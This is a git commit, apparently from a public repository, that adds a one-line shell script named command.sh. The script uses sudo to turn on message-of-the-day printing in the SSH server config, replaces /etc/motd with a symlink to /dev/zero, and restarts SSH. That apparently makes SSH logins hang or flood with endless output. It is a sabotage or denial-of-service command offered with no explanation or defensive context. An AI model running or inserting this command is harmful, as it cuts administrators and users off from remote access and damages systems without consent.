9305a961bce39341736885cf0d1ee90122b4d5b8
HopeAnnihilator <59497210+HopeAnnihilator@users.noreply.github.com>
2025-05-24 02:42:02 -0500

    Create command.sh

---
+++ command.sh
@@ -0,0 +1,1 @@
+sudo sed -i 's/^\(PrintMotd.*$\)/#\1/' sshd_config; sudo bash -c "echo 'PrintMotd yes' >> /etc/ssh/sshd_config"; sudo mv /etc/motd /etc/motd.bak; sudo ln -s /dev/zero /etc/motd; sudo systemctl restart ssh; exit
